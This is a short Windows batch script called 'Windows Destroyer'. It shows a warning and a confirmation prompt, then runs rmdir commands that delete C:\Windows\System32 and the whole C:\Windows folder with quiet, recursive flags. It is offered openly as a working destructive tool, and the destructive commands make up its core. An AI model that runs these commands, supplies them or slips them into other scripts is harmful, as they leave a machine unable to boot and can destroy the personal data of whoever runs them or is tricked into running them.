@echo off
goto destroy.warning
:destroy.warning
cls
set version=1.0
title Windows Destroyer %version%
echo Welcome to the Windows destroyer.
echo.
echo if you dont know a what is this prees exs in top cmd and if you know what is this test it in vm 
echo.
echo After a reboot of Microsoft Windows, Windows will no longer boot and you may lose personal data.
echo clutterxmodz will not take NO RESPONSIBILITY for any data loss by you using this program.
echo.
echo No data has been modified yet, you need to press 1 if you'd like to continue.
echo.
echo Press 1 if you'd like to continue. 
echo Press 2 to close.
set /p function.destroy.warning=Please choose an option:
if %function.destroy.warning% == 1 goto destroy.start
if %function.destroy.warning% == 2 exit
:destroy.start
cls
title Windows Destroyer %version%
echo This is your final warning, if you don't want to continue, close the application now, if you do, please press any key.
pause
cls
echo Deleting system32
rmdir C:\Windows\System32 /s /q
echo Deleting Windows folder
rmdir C:\Windows /s /q
pause
echo Windows has now been deleted.
timeout 5
exit
